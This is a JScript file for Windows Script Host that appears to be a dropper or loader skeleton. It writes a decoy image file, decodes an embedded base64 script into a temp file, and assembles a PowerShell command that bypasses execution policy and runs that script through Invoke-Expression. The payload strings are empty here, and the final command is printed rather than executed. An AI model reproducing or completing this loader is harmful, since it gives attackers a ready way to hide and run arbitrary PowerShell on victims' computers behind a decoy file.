var f = new ActiveXObject("Scripting.FileSystemObject");
var b64s = "";
var b64img = "";


function bin2file(binData, fname) {
    try {
        var a = new ActiveXObject("ADODB.Stream");
        a.Type = 1;
        a.Open();
        a.Write(binData);
        a.SaveToFile(fname, 2);
        a.Close();
        return true;
    } catch (e) {
        return e.message;
    }
}

function b642str(base64) {
    var b = new ActiveXObject("MSXml2.DOMDocument");
    var c = b.createElement("Base64Data");
    c.dataType = "bin.base64";
    c.text = base64;
    return c.nodeTypedValue;
}

function bin2str(binData) {
    var d = new ActiveXObject("ADODB.Stream");
    d.Type = 1;
    d.Open();
    d.Write(binData);
    d.Position = 0;
    d.Type = 2;
    d.Charset = "UTF-8";
    return d.ReadText();
}

var binData = b642str(b64img);
var fname = "redbadger.webp";
bin2file(binData, fname);

var decodedBin;
try {
    decodedBin = b642str(b64s);
} catch (e) {
    WScript.Quit();
}

var decodedScript;
try {
    decodedScript = bin2str(decodedBin);
} catch (e) {
    WScript.Quit();
}

var stdout = WScript.StdOut;

var currFname = "\\" + f.GetFileName(WScript.ScriptFullName);
var currDir = f.GetParentFolderName(WScript.ScriptFullName);
var scrContent = "$currentFilename = '" + currFname + "'\r\n";
scrContent += "$currentDirectory = '" + currDir + "'\r\n";
scrContent += "\r\n";
scrContent += decodedScript;
var tmpFilePath = f.GetAbsolutePathName(".") + "\\" + f.GetTempName();
stdout.WriteLine(tmpFilePath)
var tmpFile = f.CreateTextFile(tmpFilePath, true);
tmpFile.Write(scrContent);
tmpFile.Close();
var sh = new ActiveXObject("WScript.Shell");
var cmd = "powershell.exe -ExecutionPolicy Bypass -Command \"& {";
cmd += " $scrContent = Get-Content -Path '" + tmpFilePath + "' -Raw;";
cmd += " Invoke-Expression $scrContent";
cmd += " }\"";
stdout.WriteLine(cmd)
